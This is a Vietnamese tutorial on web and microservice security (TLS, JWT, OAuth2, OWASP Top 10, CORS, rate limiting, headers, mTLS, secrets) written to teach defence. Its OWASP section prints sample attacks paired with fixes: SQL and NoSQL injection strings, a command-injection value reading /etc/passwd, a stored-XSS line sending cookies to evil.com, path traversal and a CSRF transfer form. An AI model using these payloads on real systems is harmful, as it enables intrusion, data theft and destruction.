# Security trong Web & Microservice — Toàn diện

> Tài liệu này đi từ **các tấn công phổ biến nhất** (OWASP Top 10) đến **cách bảo vệ từng layer** trong kiến trúc microservice. Đọc xong bạn hiểu được tại sao các quyết định thiết kế security lại như vậy, không chỉ biết cách implement.

---

## Mục lục

1. [Tư duy về Security — Defense in Depth](#1-tư-duy-về-security--defense-in-depth)
2. [HTTPS / TLS — Lớp bảo vệ đầu tiên](#2-https--tls--lớp-bảo-vệ-đầu-tiên)
3. [Authentication — Bạn là ai?](#3-authentication--bạn-là-ai)
   - [3.1 Session & Cookie (cách cũ)](#31-session--cookie-cách-cũ)
   - [3.2 JWT — JSON Web Token](#32-jwt--json-web-token)
   - [3.3 OAuth2 & OpenID Connect](#33-oauth2--openid-connect)
   - [3.4 API Key](#34-api-key)
4. [Authorization — Bạn được làm gì?](#4-authorization--bạn-được-làm-gì)
5. [OWASP Top 10 — Tấn công phổ biến nhất](#5-owasp-top-10--tấn-công-phổ-biến-nhất)
   - [5.1 Injection (SQL, NoSQL, Command)](#51-injection-sql-nosql-command)
   - [5.2 XSS — Cross-Site Scripting](#52-xss--cross-site-scripting)
   - [5.3 CSRF — Cross-Site Request Forgery](#53-csrf--cross-site-request-forgery)
   - [5.4 Broken Access Control](#54-broken-access-control)
   - [5.5 Security Misconfiguration](#55-security-misconfiguration)
6. [CORS — Cross-Origin Resource Sharing](#6-cors--cross-origin-resource-sharing)
7. [Rate Limiting & DDoS Protection](#7-rate-limiting--ddos-protection)
8. [Security Headers — HTTP Response Headers](#8-security-headers--http-response-headers)
9. [Microservice Security — Service-to-Service](#9-microservice-security--service-to-service)
   - [9.1 mTLS — Mutual TLS](#91-mtls--mutual-tls)
   - [9.2 API Gateway Pattern](#92-api-gateway-pattern)
   - [9.3 Secrets Management](#93-secrets-management)
10. [Checklist thực tế](#10-checklist-thực-tế)

---

## 1. Tư duy về Security — Defense in Depth

**Không có hệ thống nào 100% an toàn.** Mục tiêu là làm cho kẻ tấn công phải tốn quá nhiều công sức so với lợi ích thu được.

**Defense in Depth** (bảo vệ nhiều lớp):

```
Internet
    │
    ▼
[Firewall / DDoS protection]      ← Layer 1: lọc traffic ác ý
    │
    ▼
[CDN / WAF — Web Application Firewall] ← Layer 2: lọc request độc hại
    │
    ▼
[API Gateway]                     ← Layer 3: auth, rate limit, routing
    │
    ▼
[Load Balancer]                   ← Layer 4: phân tải, SSL termination
    │
    ▼
[Service — Business Logic]        ← Layer 5: validate input, authorization
    │
    ▼
[Database — Least Privilege]      ← Layer 6: DB user chỉ có quyền tối thiểu
```

**Nguyên tắc cốt lõi:**
- **Least Privilege**: mỗi thành phần chỉ có quyền tối thiểu cần thiết
- **Zero Trust**: không tin tưởng bất kỳ ai mặc định — kể cả traffic nội bộ
- **Fail Secure**: khi có lỗi → từ chối truy cập (không phải cho phép)
- **Input Validation**: không tin bất kỳ input nào từ client

---

## 2. HTTPS / TLS — Lớp bảo vệ đầu tiên

### TLS hoạt động như thế nào?

```
Client (Browser)                    Server
      │                               │
      ├── ClientHello ───────────────►│  "Tôi hỗ trợ TLS 1.3, cipher suites: ..."
      │◄── ServerHello ───────────────┤  "Dùng TLS 1.3, cipher: AES-256-GCM"
      │◄── Certificate ───────────────┤  "Đây là cert của tôi (signed by CA)"
      │                               │
      │  [Browser verify cert với CA] │
      │  [Tạo session key chung]      │
      │                               │
      ├── Finished ──────────────────►│  (encrypted với session key)
      │◄── Finished ──────────────────┤
      │                               │
      ╔═══════════════════════════════╗
      ║  Mọi data từ đây đều encrypted ║
      ╚═══════════════════════════════╝
```

**Tại sao HTTPS quan trọng?**

```
HTTP (không mã hóa):
  User gõ password "abc123"
  Network packet: "POST /login  password=abc123"
  → Bất kỳ router nào trên đường đi đều đọc được (Man-in-the-Middle)

HTTPS (mã hóa):
  User gõ password "abc123"
  Network packet: "ÿ¢£§∂∑µΩæøπ..." (encrypted)
  → Không thể đọc nếu không có session key
```

**Certificate Pinning** (mobile app):
- App lưu fingerprint của server cert
- Nếu cert thay đổi (bị MITM) → app từ chối kết nối
- Dùng cho banking app, fintech

**HSTS — HTTP Strict Transport Security:**
```
Response header:
  Strict-Transport-Security: max-age=31536000; includeSubDomains

Hiệu quả:
  - Lần đầu: browser truy cập → server redirect HTTPS + set HSTS header
  - Lần sau: browser tự động dùng HTTPS, không cần redirect
  - Phòng: SSL stripping attack (kẻ tấn công downgrade HTTPS → HTTP)
```

---

## 3. Authentication — Bạn là ai?

### 3.1 Session & Cookie (cách cũ)

```
Login flow:
  Client ──POST /login {user, pass}──► Server
  Server verify → tạo session ID → lưu vào DB/Redis
  Server ──Set-Cookie: sessionId=abc123──► Client
  Client lưu cookie → tự động gửi kèm mọi request sau

  Client ──GET /profile──────────────► Server
          Cookie: sessionId=abc123
  Server tra DB: "abc123 → user:456" → trả data

Điểm yếu:
  ✅ Đơn giản, kiểm soát tốt (revoke ngay khi cần)
  ❌ Server phải lưu state (session store) → không scale tốt
  ❌ Cookie vulnerable với CSRF nếu không bảo vệ đúng
  ❌ Shared session store → single point of failure
```

### 3.2 JWT — JSON Web Token

```
Cấu trúc JWT:
  eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VySWQiOjEyM30 . SflKxwRJSMeKKF2QT4fw
       HEADER                    PAYLOAD              SIGNATURE
  (base64url encoded)        (base64url encoded)   (HMAC/RSA)

Decode ra:
  Header:  { "alg": "HS256", "typ": "JWT" }
  Payload: { "userId": 123, "role": "admin", "exp": 1750000000 }
  Signature: HMACSHA256(header + "." + payload, SECRET_KEY)

Login flow:
  Client ──POST /login {user, pass}──► Server
  Server verify → tạo JWT → ký bằng SECRET_KEY
  Server ──{ token: "eyJ..." }────────► Client
  Client lưu token (localStorage hoặc memory)

  Client ──GET /profile──────────────► Server
          Authorization: Bearer eyJ...
  Server verify chữ ký → decode payload → không cần DB lookup
```

**JWT không lưu state trên server** — đây là điểm khác biệt cốt lõi:

```
Session:  Server giữ "abc123 = user 456"  → có thể revoke ngay
JWT:      Server không giữ gì             → không thể revoke trực tiếp

Giải pháp revoke JWT:
  1. Blacklist: lưu token bị revoke vào Redis (mất đi lợi thế stateless)
  2. Short expiry: access token sống 15 phút, refresh token sống 7 ngày
  3. Rotate refresh: mỗi lần dùng refresh token → issue cặp mới
```

**Access Token vs Refresh Token:**

```
Sau login:
  access_token:  eyJ...  (sống 15 phút — gửi kèm mọi API request)
  refresh_token: eyJ...  (sống 7 ngày — chỉ gửi khi cần token mới)

Flow:
  [15 phút sau] GET /api/data → 401 Unauthorized (access token hết hạn)
  POST /auth/refresh { refresh_token } → nhận access_token mới
  GET /api/data (với token mới) → 200 OK

  [7 ngày sau] POST /auth/refresh → 401 → user phải login lại

Lý do:
  - access token ngắn → nếu bị lộ, chỉ dùng được 15 phút
  - refresh token dài → lưu httpOnly cookie (không đọc được bằng JS)
```

**Lỗi hay gặp với JWT:**
```
❌ Lưu JWT vào localStorage:
   → Vulnerable XSS: JS độc hại đọc localStorage được
   ✅ Lưu access token trong memory (biến JS), refresh token trong httpOnly cookie

❌ Không verify signature phía server:
   Kẻ tấn công sửa payload: { "role": "admin" } → ký lại bằng "none" algorithm
   → Phải luôn verify chữ ký, không tin payload raw

❌ JWT sống quá lâu (exp: 30 ngày):
   → Nếu bị lộ: attacker dùng được 30 ngày
   ✅ Access token: 15 phút, refresh token: 7 ngày

❌ Lưu secret key trong code:
   ✅ Dùng biến môi trường, secret manager (AWS Secrets Manager, Vault)
```

### 3.3 OAuth2 & OpenID Connect

**OAuth2** giải quyết bài toán: "Cho phép app A truy cập data của tôi trên app B mà không cần chia sẻ password":

```
Ví dụ: Shopee dùng "Đăng nhập bằng Google"

  User ──"Login with Google"──────────► Shopee
  Shopee ──redirect──────────────────► Google Auth Server
  User đăng nhập Google               (Shopee không thấy password Google)
  Google ──redirect + auth_code──────► Shopee callback
  Shopee ──auth_code + client_secret─► Google token endpoint
  Google ──access_token + id_token───► Shopee
  Shopee decode id_token: { email, name, sub: "google-user-id-123" }
  Shopee tìm/tạo account → login user

Các bên:
  Resource Owner: User (chủ tài khoản Google)
  Client:         Shopee (app muốn access)
  Auth Server:    Google (cấp phát token)
  Resource Server: Google APIs (cung cấp data)
```

**OpenID Connect** = OAuth2 + thêm id_token (JWT chứa thông tin user):
- OAuth2: "Tôi có quyền làm X"
- OIDC:   "Đây là danh tính tôi" + "Tôi có quyền làm X"

### 3.4 API Key

Đơn giản nhất — dùng cho service-to-service hoặc public API:

```
Client ──GET /api/data──────────────► Server
        X-API-Key: sk_live_abc123

Server lookup: "sk_live_abc123 → merchant_id: 456, rate_limit: 1000/min"
```

**Best practices:**
- Prefix để nhận ra ngay: `sk_live_`, `pk_test_`, `ghp_`
- Không bao giờ commit API key vào git
- Rotate định kỳ
- Scope: mỗi key chỉ có quyền nhất định (read-only, write, admin)
- Audit log: mỗi request ghi lại key nào gọi

---

## 4. Authorization — Bạn được làm gì?

**Authentication ≠ Authorization:**
- Authentication: "Bạn là ai?" → xác minh danh tính
- Authorization: "Bạn được làm gì?" → kiểm tra quyền

### RBAC — Role-Based Access Control

```
User → có nhiều Roles → mỗi Role có nhiều Permissions

user_456:
  roles: ["customer", "seller"]

seller role:
  permissions: ["product:create", "product:update", "order:read:own"]

customer role:
  permissions: ["order:create", "order:read:own", "review:create"]

Kiểm tra:
  user_456 DELETE /products/789 → cần permission "product:delete"
  → user không có permission này → 403 Forbidden
```

### ABAC — Attribute-Based Access Control

Phức tạp hơn RBAC — quyền dựa trên **thuộc tính** của user, resource, context:

```
Policy: "Seller được edit product NẾU product.owner_id == user.id"

user_456 PUT /products/789:
  product.owner_id = 456  →  user.id = 456  →  MATCH → 200 OK

user_456 PUT /products/999:
  product.owner_id = 111  →  user.id = 456  →  NO MATCH → 403 Forbidden
```

**Lỗi hay gặp — Broken Object Level Authorization (BOLA/IDOR):**
```
❌ Sai:
  GET /orders/12345  → server trả order 12345 cho bất kỳ authenticated user nào
  → Attacker thay đổi ID: GET /orders/12346 → xem order của người khác!

✅ Đúng:
  GET /orders/12345
  Server: order.user_id === request.user.id ? return order : 403
  → Luôn kiểm tra ownership trước khi trả data
```

---

## 5. OWASP Top 10 — Tấn công phổ biến nhất

### 5.1 Injection (SQL, NoSQL, Command)

**SQL Injection** — tấn công phổ biến nhất, dễ phòng nhất:

```
❌ Code sai (string concatenation):
  const query = "SELECT * FROM users WHERE email = '" + email + "'";

  Attacker gửi: email = "' OR '1'='1"
  Query thực thi: SELECT * FROM users WHERE email = '' OR '1'='1'
  → Trả về TẤT CẢ users

  Nguy hiểm hơn: email = "'; DROP TABLE users; --"
  → Xóa toàn bộ bảng users

✅ Code đúng (parameterized query / prepared statement):
  const query = "SELECT * FROM users WHERE email = $1";
  db.query(query, [email]);
  // DB treat email như data, không parse là SQL
  // "' OR '1'='1" → tìm kiếm đúng nghĩa đen, không tìm được → trả về []
```

**NoSQL Injection (MongoDB):**
```
❌ Sai:
  db.users.find({ email: req.body.email, password: req.body.password })

  Attacker gửi: { "email": "admin@site.com", "password": { "$ne": null } }
  Query: { email: "admin@site.com", password: { $ne: null } }
  → $ne: null = "password khác null" = luôn true → bypass login!

✅ Đúng:
  // Validate type: password phải là string
  if (typeof req.body.password !== 'string') return res.status(400)...
  // Hoặc dùng schema validation (Joi, Zod)
```

**Command Injection:**
```
❌ Sai:
  const filename = req.query.file;
  exec(`cat /uploads/${filename}`);

  Attacker: file = "report.pdf; cat /etc/passwd"
  Thực thi: cat /uploads/report.pdf; cat /etc/passwd
  → Đọc được file system

✅ Đúng:
  // Không bao giờ dùng exec với input từ user
  // Dùng fs.readFile với path validation
  const safeName = path.basename(filename); // chỉ lấy tên file, bỏ path traversal
  if (!/^[a-zA-Z0-9-_.]+$/.test(safeName)) return 400;
  fs.readFile(path.join('/uploads', safeName), ...)
```

### 5.2 XSS — Cross-Site Scripting

Kẻ tấn công inject JavaScript vào page → chạy trong browser của victim:

```
Stored XSS (nguy hiểm nhất):
  Attacker post comment: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
  Server lưu vào DB
  Victim A vào xem comment → script chạy → cookie bị gửi về evil.com
  Attacker dùng cookie đăng nhập thành Victim A

Reflected XSS:
  URL: https://shop.com/search?q=<script>alert(1)</script>
  Server render: <h1>Kết quả: <script>alert(1)</script></h1>
  → Script chạy trong browser victim khi click link này

DOM-based XSS:
  JS code: document.innerHTML = location.hash
  URL: https://shop.com/#<img src=x onerror=alert(1)>
```

**Phòng chống XSS:**
```
1. Escape output (quan trọng nhất):
   User input: <script>alert(1)</script>
   Sau escape: &lt;script&gt;alert(1)&lt;/script&gt;
   → Browser hiển thị text, không thực thi

2. Content Security Policy (CSP) header:
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
   → Browser chỉ chạy script từ same origin hoặc có nonce
   → Script inject không có nonce → bị block

3. httpOnly cookie:
   Set-Cookie: session=abc; httpOnly; Secure; SameSite=Strict
   → JS không đọc được cookie này
   → Dù bị XSS → attacker không lấy được session cookie

4. DOMPurify (nếu cần render HTML từ user):
   const clean = DOMPurify.sanitize(userInput);
   element.innerHTML = clean;
```

### 5.3 CSRF — Cross-Site Request Forgery

Trick browser của victim gửi request tới site họ đang đăng nhập:

```
Scenario:
  Victim đang đăng nhập bank.com (có cookie hợp lệ)
  Victim vào evil.com — trang có đoạn HTML ẩn:
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker-account">
      <input name="amount" value="10000000">
    </form>
    <script>document.forms[0].submit()</script>

  Browser tự động gửi request tới bank.com KÈM cookie
  → bank.com nhận thấy cookie hợp lệ → thực hiện chuyển tiền!

Phòng chống:
  1. CSRF Token:
     Server gửi form kèm token ngẫu nhiên: <input name="_csrf" value="a8f3...">
     Server verify token khi nhận POST
     evil.com không biết token này → không thể forge request

  2. SameSite Cookie:
     Set-Cookie: session=abc; SameSite=Strict
     → Cookie KHÔNG được gửi khi request xuất phát từ site khác
     → evil.com trigger form → browser không gửi cookie → 401

  3. Custom Header:
     Client: fetch('/api/transfer', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
     → Simple form không set được custom header → server kiểm tra header này
```

### 5.4 Broken Access Control

```
Các dạng phổ biến:

1. IDOR (Insecure Direct Object Reference):
   GET /api/invoices/1234  → người dùng khác đổi thành /api/invoices/1235
   ✅ Fix: luôn filter by user_id trong query

2. Privilege Escalation:
   User gửi: PUT /users/456 { "role": "admin" }
   ❌ Server cập nhật role mà không kiểm tra quyền
   ✅ Fix: whitelist fields được phép update, role chỉ admin mới đổi được

3. Path Traversal:
   GET /files?name=../../etc/passwd
   ✅ Fix: path.basename(), whitelist extension, serve từ folder riêng

4. Missing Function-Level Access Control:
   Admin endpoint /admin/users không check token → ai cũng gọi được
   ✅ Fix: middleware auth trên mọi route, không chỉ data routes
```

### 5.5 Security Misconfiguration

```
Lỗi phổ biến nhất — không phải code, mà là cấu hình:

❌ Default credentials:
   MongoDB không set auth → bất kỳ ai cũng connect được
   Admin panel dùng admin/admin
   ✅ Fix: luôn set auth, đổi default password ngay khi cài

❌ Debug mode production:
   NODE_ENV=development → stack trace lộ ra browser
   → Attacker thấy đường dẫn file, version library, cấu trúc DB
   ✅ Fix: NODE_ENV=production, custom error handler không leak detail

❌ Unnecessary services:
   Server expose port 6379 (Redis), 5432 (Postgres) ra internet
   ✅ Fix: firewall chỉ cho phép internal network access

❌ Outdated dependencies:
   Log4Shell (2021): Log4j 2.x → remote code execution
   Attackers scan log4j version → chạy code từ xa
   ✅ Fix: cập nhật dependency thường xuyên, dùng npm audit / snyk

❌ Verbose error messages:
   { "error": "Column 'password' in field list is ambiguous" }  ← lộ schema DB
   ✅ Fix: generic error message ra ngoài, log chi tiết internal
```

---

## 6. CORS — Cross-Origin Resource Sharing

```
Same-Origin Policy (browser enforce):
  Page tại https://shop.com chỉ được fetch từ https://shop.com
  Fetch tới https://api.shop.com (subdomain khác) → browser BLOCK

  Lý do: ngăn evil.com đọc data từ bank.com dù user đang login bank.com

CORS cho phép server nói: "Tôi tin domain X, cho phép fetch từ đó"

Preflight request (cho non-simple requests):
  Browser ──OPTIONS /api/data──────────────► api.shop.com
          Origin: https://shop.com
          Access-Control-Request-Method: POST
          Access-Control-Request-Headers: Content-Type, Authorization

  api.shop.com ◄─────────────────────────── Check whitelist
  api.shop.com ──200 OK────────────────────► Browser
  Access-Control-Allow-Origin: https://shop.com
  Access-Control-Allow-Methods: GET, POST, PUT
  Access-Control-Allow-Headers: Content-Type, Authorization

  [Browser thấy được phép → gửi request thật]
  Browser ──POST /api/data─────────────────► api.shop.com
```

**Lỗi cấu hình CORS nguy hiểm:**
```
❌ Access-Control-Allow-Origin: *  với  Access-Control-Allow-Credentials: true
   → Không được phép (browser ignore) nhưng nhiều dev vô tình expose

❌ Reflect Origin mà không validate:
   if (req.headers.origin) {
     res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // ← SAI
   }
   → Mọi origin đều được phép, kể cả evil.com

✅ Đúng:
   const ALLOWED_ORIGINS = ['https://shop.com', 'https://admin.shop.com'];
   if (ALLOWED_ORIGINS.includes(req.headers.origin)) {
     res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
   }
```

---

## 7. Rate Limiting & DDoS Protection

### Rate Limiting

```
Mục đích:
  - Ngăn brute force: thử 1 triệu password trong 1 giây
  - Ngăn scraping: crawl toàn bộ catalog
  - Ngăn spam: gửi 10.000 email reset password
  - Kiểm soát chi phí API

Algorithms:

1. Fixed Window:
   100 requests/minute — đếm từ xx:00 đến xx:59
   Điểm yếu: attacker gửi 100 req lúc xx:59, 100 req lúc xx:00 → 200 req trong 2 giây

2. Sliding Window:
   Tính 60 giây về trước từ mỗi request → không bị bypass ở ranh giới window

3. Token Bucket (phổ biến nhất):
   Mỗi user có bucket chứa tối đa 100 token
   Mỗi request tiêu 1 token
   Token được thêm vào với tốc độ 10/giây (tối đa 100)
   → Cho phép burst ngắn, kiểm soát tốc độ dài hạn

4. Leaky Bucket:
   Request vào queue, xử lý đều đặn (tốc độ cố định)
   → Không cho burst, smooth traffic

Triển khai với Redis (scale-out):
  // Mỗi request: INCR user:456:ratelimit  (atomic)
  //              EXPIRE user:456:ratelimit 60
  // Nếu > 100 → 429 Too Many Requests
```

### DDoS — Distributed Denial of Service

```
Các loại DDoS:

Volumetric: flood bandwidth (Gbps UDP/ICMP packets)
  → Giải pháp: CDN/DDoS scrubbing service (Cloudflare, AWS Shield)
  → Filter ở network level trước khi tới server

Protocol: exploit TCP/IP (SYN flood: gửi triệu SYN không hoàn thành handshake)
  → Server hết slot TCP connection
  → Giải pháp: SYN cookies, firewall rule, cloud-level protection

Application Layer (L7): HTTP GET/POST flood (khó phát hiện vì trông như traffic bình thường)
  → WAF (Web Application Firewall): phân tích pattern, block IP, JS challenge
  → Rate limiting

Kiến trúc phòng DDoS:
  Internet → [Cloudflare/Akamai — scrub traffic] → [Your servers]
  → 99% DDoS traffic bị hấp thụ tại edge trước khi tới server
```

---

## 8. Security Headers — HTTP Response Headers

Thêm headers này vào mọi response để browser tự động enforce security:

```
# Ngăn browser render page trong iframe (clickjacking)
X-Frame-Options: DENY

# Ngăn browser đoán content type (MIME sniffing)
X-Content-Type-Options: nosniff

# Chỉ cho phép load script/style/font từ các nguồn được phép
Content-Security-Policy: default-src 'self'; img-src *; script-src 'self' cdn.trusted.com

# Bắt buộc HTTPS, báo browser không dùng HTTP bao giờ
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Kiểm soát thông tin referrer gửi khi navigate
Referrer-Policy: strict-origin-when-cross-origin

# Giới hạn quyền browser API (camera, microphone, geolocation)
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

**Kiểm tra headers của site bạn:** https://securityheaders.com

---

## 9. Microservice Security — Service-to-Service

### 9.1 mTLS — Mutual TLS

```
TLS thường (1-way):
  Client verify server cert (đảm bảo đúng server)
  Server không verify client

mTLS (2-way) — Zero Trust giữa microservices:
  order-service verify inventory-service cert
  inventory-service verify order-service cert
  → Chỉ service có cert hợp lệ mới giao tiếp được

  order-service ──GET /inventory─────► inventory-service
  [TLS Handshake: cả 2 bên show cert]
  [CA verify both certs]
  → Dù attacker vào được internal network → không có cert hợp lệ → bị reject

Thực tế: Service Mesh (Istio, Linkerd) tự động handle mTLS
  - Inject sidecar proxy vào mỗi pod
  - Proxy handle TLS → service code không cần biết
  - Cert rotation tự động
```

### 9.2 API Gateway Pattern

```
KHÔNG có API Gateway:
  Browser ──────────────────────────► order-service :3001    ← lộ port
  Browser ──────────────────────────► inventory-service :3002 ← lộ port
  Browser ──────────────────────────► payment-service :3003   ← lộ port
  → Mỗi service phải tự handle: auth, rate limit, logging, CORS

CÓ API Gateway:
  Browser ──────────────────────────► API Gateway :443
                                           │ verify JWT
                                           │ rate limit
                                           │ log request
                                           │ route
                                     ┌─────┼─────┐
                                 order  inventory payment
                               (internal only — không expose ra ngoài)

API Gateway làm:
  ✅ Authentication: verify JWT trước khi forward
  ✅ Authorization: check permission → route phù hợp
  ✅ Rate Limiting: 100 req/min per user
  ✅ SSL Termination: HTTPS externally, HTTP internally
  ✅ Request/Response transformation
  ✅ Circuit Breaker (kết hợp với resilience)
  ✅ Audit Logging: ai gọi gì lúc nào

Công cụ phổ biến:
  Kong, AWS API Gateway, Azure APIM, nginx + Lua, Traefik
```

### 9.3 Secrets Management

```
❌ Không bao giờ làm:
  // hardcode trong code
  const DB_PASSWORD = "super_secret_123";
  
  // commit lên git
  .env file trong repo

✅ Cách đúng:

1. Environment variables (dev/staging):
   DB_PASSWORD=super_secret_123 node server.js
   Hoặc .env file trong .gitignore

2. Secret Manager (production):
   AWS Secrets Manager / HashiCorp Vault / Azure Key Vault
   
   // Fetch secret tại runtime
   const secret = await secretsManager.getSecretValue({ SecretId: 'prod/db/password' });
   const { password } = JSON.parse(secret.SecretString);
   
   → Secret không bao giờ ở trong code hoặc file config
   → Rotation tự động (mỗi 30 ngày đổi password DB mà không restart service)
   → Audit log: ai, khi nào, truy cập secret nào

3. Kubernetes Secrets (nếu dùng k8s):
   Inject vào pod dưới dạng env var hoặc file
   Kết hợp với Vault để encrypt at rest
```

---

## 10. Checklist thực tế

### Trước khi deploy production:

```
HTTPS & Transport:
  [ ] HTTPS bật, redirect HTTP → HTTPS
  [ ] HSTS header set
  [ ] TLS 1.2+ only, disable TLS 1.0/1.1
  [ ] Cert không hết hạn, auto-renewal (Let's Encrypt)

Authentication:
  [ ] Password hash bằng bcrypt/argon2 (KHÔNG md5, sha1)
  [ ] JWT short-lived (< 15 phút access token)
  [ ] Refresh token httpOnly cookie
  [ ] Rate limit login endpoint (5 lần/phút per IP)

Authorization:
  [ ] Mọi route có auth đều check JWT
  [ ] Mọi DB query có filter by owner
  [ ] Admin routes check role

Input Validation:
  [ ] Validate type, length, format cho mọi input
  [ ] Parameterized queries (không string concat SQL)
  [ ] Escape output khi render HTML

Security Headers:
  [ ] X-Frame-Options
  [ ] X-Content-Type-Options
  [ ] Content-Security-Policy
  [ ] Strict-Transport-Security

Infrastructure:
  [ ] DB không expose ra internet
  [ ] Secrets trong env var hoặc secret manager
  [ ] NODE_ENV=production (tắt debug)
  [ ] Dependency audit (npm audit)
  [ ] Error messages không leak internal details
  [ ] Logging không ghi password/token
```

### Công cụ kiểm tra:

```
npm audit                    — scan dependency vulnerabilities
OWASP ZAP                   — automated security testing
Burp Suite                  — manual penetration testing
snyk.io                     — continuous vulnerability monitoring
https://securityheaders.com — kiểm tra HTTP headers
SSL Labs (ssllabs.com)      — kiểm tra TLS configuration
```
